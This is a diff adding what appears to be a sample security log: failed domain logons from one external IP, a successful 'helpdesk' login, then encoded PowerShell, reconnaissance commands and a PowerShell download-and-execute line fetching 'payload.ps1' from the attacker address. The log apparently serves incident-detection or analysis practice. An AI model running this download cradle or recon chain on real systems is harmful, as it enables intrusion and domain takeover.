@@ -1,0 +1,45 @@
+2026-06-01 10:15:01 EventCode=4625 ComputerName=DC01 Account_Name=john.doe Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:03 EventCode=4625 ComputerName=DC01 Account_Name=sarah.smith Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:05 EventCode=4625 ComputerName=DC01 Account_Name=administrator Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:08 EventCode=4625 ComputerName=DC01 Account_Name=backupadmin Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:10 EventCode=4625 ComputerName=DC01 Account_Name=itadmin Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:13 EventCode=4625 ComputerName=DC01 Account_Name=helpdesk Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:17 EventCode=4625 ComputerName=DC01 Account_Name=vpnadmin Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:20 EventCode=4625 ComputerName=DC01 Account_Name=svc_backup Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:25 EventCode=4625 ComputerName=DC01 Account_Name=domainadmin Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:15:30 EventCode=4625 ComputerName=DC01 Account_Name=administrator Source_Network_Address=185.199.110.153 LogonType=3 Failure_Reason="Unknown user name or bad password"
+
+2026-06-01 10:16:05 EventCode=4624 ComputerName=DC01 Account_Name=helpdesk Source_Network_Address=185.199.110.153 LogonType=3 AuthenticationPackage=NTLM
+
+2026-06-01 10:16:10 firewall src_ip=185.199.110.153 dst_ip=10.10.50.10 dst_port=445 action=allowed
+
+2026-06-01 10:16:12 firewall src_ip=185.199.110.153 dst_ip=10.10.50.20 dst_port=3389 action=allowed
+
+2026-06-01 10:16:15 firewall src_ip=185.199.110.153 dst_ip=10.10.50.30 dst_port=445 action=allowed
+
+2026-06-01 10:16:30 EventCode=1 ComputerName=WS01 User=CORP\helpdesk Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentImage=C:\Windows\System32\services.exe CommandLine="powershell.exe -EncodedCommand SQBFAFgA"
+
+2026-06-01 10:16:40 EventCode=1 ComputerName=WS01 User=CORP\helpdesk Image=C:\Windows\System32\cmd.exe ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="cmd.exe /c whoami"
+
+2026-06-01 10:16:50 EventCode=1 ComputerName=WS01 User=CORP\helpdesk Image=C:\Windows\System32\net.exe ParentImage=C:\Windows\System32\cmd.exe CommandLine="net user"
+
+2026-06-01 10:17:05 EventCode=1 ComputerName=WS01 User=CORP\helpdesk Image=C:\Windows\System32\nltest.exe ParentImage=C:\Windows\System32\cmd.exe CommandLine="nltest /dclist"
+
+2026-06-01 10:17:20 EventCode=1 ComputerName=WS01 User=CORP\helpdesk Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentImage=C:\Windows\System32\cmd.exe CommandLine="IEX(New-Object Net.WebClient).DownloadString('http://185.199.110.153/payload.ps1')"
+
+2026-06-01 10:17:40 EventCode=4688 ComputerName=WS01 NewProcessName=C:\Windows\System32\rundll32.exe ParentProcessName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+2026-06-01 10:18:00 EventCode=4688 ComputerName=WS01 NewProcessName=C:\Windows\System32\wmic.exe ParentProcessName=C:\Windows\System32\cmd.exe CommandLine="wmic process list"
+
+2026-06-01 10:18:15 EventCode=4688 ComputerName=WS01 NewProcessName=C:\Windows\System32\net.exe ParentProcessName=C:\Windows\System32\cmd.exe CommandLine="net group 'Domain Admins' /domain"
+
+2026-06-01 10:18:45 EventCode=4688 ComputerName=WS01 NewProcessName=C:\Windows\System32\quser.exe ParentProcessName=C:\Windows\System32\cmd.exe
